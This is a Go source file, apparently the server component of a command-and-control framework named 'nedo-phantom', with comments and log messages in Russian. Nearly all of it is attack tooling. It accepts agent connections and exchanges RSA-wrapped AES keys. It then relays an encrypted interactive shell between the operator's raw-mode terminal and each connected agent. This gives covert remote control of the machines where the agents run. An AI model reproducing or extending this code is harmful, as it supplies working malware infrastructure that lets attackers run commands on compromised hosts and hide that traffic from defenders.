package server

import (
    "bufio"
    "encoding/binary"
		"encoding/pem"
    "fmt"
    "net"
    "os"
    "strings"
    "syscall"
    "time"
    "unsafe"
    
    "nedo-phantom/internal/c2/crypto"
    "nedo-phantom/internal/common"
    "nedo-phantom/internal/c2/db"
)

type Server struct {
    addr   string
    tasks  *db.TaskQueue
    agents map[string]*AgentSession
}

type AgentSession struct {
    conn     		net.Conn
    hostname 		string
    lastSeen 		time.Time
		publicKey 	string
		aesKey 			[]byte
		secureConn	*common.SecureConn
}

func NewServer(addr string) *Server {
    return &Server{
        addr:   addr,
        tasks:  db.NewTaskQueue(),
        agents: make(map[string]*AgentSession),
    }
}

func (s *Server) Run() error {
    listener, err := net.Listen("tcp", s.addr)
    if err != nil {
        return err
    }
    defer listener.Close()
    
    fmt.Printf("[C2] Server listening on %s\n", s.addr)
    
    for {
        conn, err := listener.Accept()
        if err != nil {
            fmt.Printf("Accept error: %v\n", err)
            continue
        }
        go s.handleAgent(conn)
    }
}

func (s *Server) handleAgent(conn net.Conn) {
    defer conn.Close()
    
    // 1. Читаем публичный ключ агента
    reader := bufio.NewReader(conn)
    
		 // Читаем ВСЕ строки, пока не встретим конец PEM
    var fullPEM strings.Builder
    for {
        line, err := reader.ReadString('\n')
        if err != nil {
            fmt.Println("Ошибка чтения:", err)
            return
        }
        fullPEM.WriteString(line)
        if strings.Contains(line, "-----END PUBLIC KEY-----") {
            break
        }
    }
    
    pemData := fullPEM.String()
    if !strings.HasPrefix(pemData, "KEY:") {
        fmt.Println("Неверный формат: ожидается 'KEY:'")
        return
    }
    
		// Убираем "KEY:"
    publicKeyPEM := strings.TrimPrefix(pemData, "KEY:")
    publicKeyPEM = strings.TrimSpace(publicKeyPEM)

		fmt.Printf("[+] Получен публичный ключ от агента\n")
		fmt.Printf("[+] Длина PEM: %d байт\n", len(publicKeyPEM))

		// Проверим что ключ можно распарсить
		block, _ := pem.Decode([]byte(publicKeyPEM))
		if block == nil {
				fmt.Println("[-] Ошибка: не удалось декодировать PEM")
				if len(publicKeyPEM) > 200 {
            fmt.Printf("[-] Начало PEM: %s...\n", publicKeyPEM[:200])
        }
				return
		}
		fmt.Printf("[+] PEM успешно декодирован, тип: %s\n", block.Type)

    // 2. Генерируем AES ключ
    aesKey, err := crypto.GenerateSymmetricKey()
    if err != nil {
        fmt.Printf("[-] Ошибка генерации AES ключа: %v\n", err)
        return
    }
    fmt.Printf("[+] AES ключ сгенерирован (%d байт)\n", len(aesKey))
    
    // 3. Шифруем AES ключ через RSA публичный ключ агента
    encryptedKey, err := crypto.EncryptSymmetricKey(publicKeyPEM, aesKey)
    if err != nil {
        fmt.Printf("[-] Ошибка шифрования AES ключа: %v\n", err)
        return
    }
    fmt.Printf("[+] AES ключ зашифрован (%d байт)\n", len(encryptedKey))  // <-- исправлено
    
    // 4. Отправляем зашифрованный ключ (длина 4 байта + данные)
    lengthBuf := make([]byte, 4)
    binary.BigEndian.PutUint32(lengthBuf, uint32(len(encryptedKey)))  // <-- исправлено
    if _, err := conn.Write(lengthBuf); err != nil {
        fmt.Printf("[-] Ошибка отправки длины: %v\n", err)
        return
    }
    if _, err := conn.Write(encryptedKey); err != nil {
        fmt.Printf("[-] Ошибка отправки ключа: %v\n", err)
        return
    }
    fmt.Println("[+] Зашифрованный AES ключ отправлен агенту")
    
    // 5. Создаем ServerCrypto с AES ключом
    serverCrypto := crypto.NewServerCryptoFromKey(aesKey)
    
    // 6. Читаем hostname (зашифрован)
    hostname, err := s.readSecureString(conn, serverCrypto)
    if err != nil {
        fmt.Printf("[-] Ошибка чтения hostname: %v\n", err)
        return
    }
    fmt.Printf("[+] Агент подключился: %s\n", hostname)
    
    // 7. Сохраняем сессию
    s.agents[hostname] = &AgentSession{
        conn:       conn,
        hostname:   hostname,
        lastSeen:   time.Now(),
        publicKey:  publicKeyPEM,
        aesKey:     aesKey,
        secureConn: nil, // Пока nil, можно будет использовать позже
    }
    
    // Сохраняем оригинальные настройки терминала
    fd := os.Stdin.Fd()
    var originalTermios syscall.Termios
    syscall.Syscall(syscall.SYS_IOCTL, fd, syscall.TCGETS, uintptr(unsafe.Pointer(&originalTermios)))
    
    // Переводим терминал сервера в raw-режим
    s.setRawTerminal()
    
    // 8. Интерактивный режим с шифрованием
    s.interactiveModeSecure(conn, serverCrypto)
    
    // Восстанавливаем терминал
    s.resetTerminal(originalTermios)
    
    // Удаляем сессию
    delete(s.agents, hostname)
    fmt.Printf("[+] Сессия с агентом %s завершена\n", hostname)
}

func (s *Server) setRawTerminal() error {
    fd := os.Stdin.Fd()
    var termios syscall.Termios
    _, _, errno := syscall.Syscall(
        syscall.SYS_IOCTL,
        fd,
        syscall.TCGETS,
        uintptr(unsafe.Pointer(&termios)),
    )
    if errno != 0 {
        return fmt.Errorf("ошибка TCGETS: %v", errno)
    }
    
    termios.Lflag &^= syscall.ECHO | syscall.ICANON | syscall.ISIG
    termios.Iflag &^= syscall.IXON | syscall.ICRNL
    termios.Oflag &^= syscall.OPOST
    termios.Cflag |= syscall.CS8
    
    _, _, errno = syscall.Syscall(
        syscall.SYS_IOCTL,
        fd,
        syscall.TCSETS,
        uintptr(unsafe.Pointer(&termios)),
    )
    if errno != 0 {
        return fmt.Errorf("ошибка TCSETS: %v", errno)
    }
    return nil
}

func (s *Server) resetTerminal(originalTermios syscall.Termios) error {
    fd := os.Stdin.Fd()
    _, _, errno := syscall.Syscall(
        syscall.SYS_IOCTL,
        fd,
        syscall.TCSETS,
        uintptr(unsafe.Pointer(&originalTermios)),
    )
    if errno != 0 {
        return fmt.Errorf("ошибка восстановления терминала: %v", errno)
    }
    return nil
}

func (s *Server) interactiveMode(conn net.Conn) {
    conn.SetReadDeadline(time.Time{})
    done := make(chan bool)
    
    // Сокет -> stdout
    go func() {
        buf := make([]byte, 4096)
        for {
            n, err := conn.Read(buf)
            if n > 0 {
                if _, writeErr := os.Stdout.Write(buf[:n]); writeErr != nil {
                    done <- true
                    return
                }
            }
            if err != nil {
                done <- true
                return
            }
        }
    }()
    
    // stdin -> сокет
    go func() {
        buf := make([]byte, 4096)
        for {
            n, err := os.Stdin.Read(buf)
            if n > 0 {
                if _, writeErr := conn.Write(buf[:n]); writeErr != nil {
                    done <- true
                    return
                }
            }
            if err != nil {
                done <- true
                return
            }
        }
    }()
    
    <-done
    fmt.Println("\n[+] Выход из интерактивного режима")
    conn.SetReadDeadline(time.Now().Add(60 * time.Second))
}

// readSecureString читает зашифрованную строку с префиксом длины
func (s *Server) readSecureString(conn net.Conn, crypto *crypto.ServerCrypto) (string, error) {
    lengthBuf := make([]byte, 4)
    if _, err := conn.Read(lengthBuf); err != nil {
        return "", err
    }
    length := binary.BigEndian.Uint32(lengthBuf)
    
    encrypted := make([]byte, length)
    if _, err := conn.Read(encrypted); err != nil {
        return "", err
    }
    
    plaintext, err := crypto.Decrypt(encrypted)
    if err != nil {
        return "", err
    }
    
    return string(plaintext), nil
}

// interactiveModeSecure - интерактивный режим с шифрованием
func (s *Server) interactiveModeSecure(conn net.Conn, crypto *crypto.ServerCrypto) {
    conn.SetReadDeadline(time.Time{})
    done := make(chan bool)
    
    // Горутина: Агент -> экран сервера (расшифровываем)
    go func() {
        for {
            data, err := s.readSecureData(conn, crypto)
            if err != nil {
                done <- true
                return
            }
            os.Stdout.Write(data)
        }
    }()
    
    // Горутина: Клавиатура сервера -> агент (шифруем)
    go func() {
        buf := make([]byte, 4096)
        for {
            n, err := os.Stdin.Read(buf)
            if n > 0 {
                if err := s.writeSecureData(conn, crypto, buf[:n]); err != nil {
                    done <- true
                    return
                }
            }
            if err != nil {
                done <- true
                return
            }
        }
    }()
    
    <-done
    fmt.Println("\n[+] Выход из интерактивного режима")
    conn.SetReadDeadline(time.Now().Add(60 * time.Second))
}

// readSecureData читает зашифрованные данные с префиксом длины
func (s *Server) readSecureData(conn net.Conn, crypto *crypto.ServerCrypto) ([]byte, error) {
    lengthBuf := make([]byte, 4)
    if _, err := conn.Read(lengthBuf); err != nil {
        return nil, err
    }
    length := binary.BigEndian.Uint32(lengthBuf)
    
    encrypted := make([]byte, length)
    if _, err := conn.Read(encrypted); err != nil {
        return nil, err
    }
    
    return crypto.Decrypt(encrypted)
}

// writeSecureData отправляет зашифрованные данные
func (s *Server) writeSecureData(conn net.Conn, crypto *crypto.ServerCrypto, data []byte) error {
    encrypted, err := crypto.Encrypt(data)
    if err != nil {
        return err
    }
    
    lengthBuf := make([]byte, 4)
    binary.BigEndian.PutUint32(lengthBuf, uint32(len(encrypted)))
    if _, err := conn.Write(lengthBuf); err != nil {
        return err
    }
    
    if _, err := conn.Write(encrypted); err != nil {
        return err
    }
    
    return nil
}
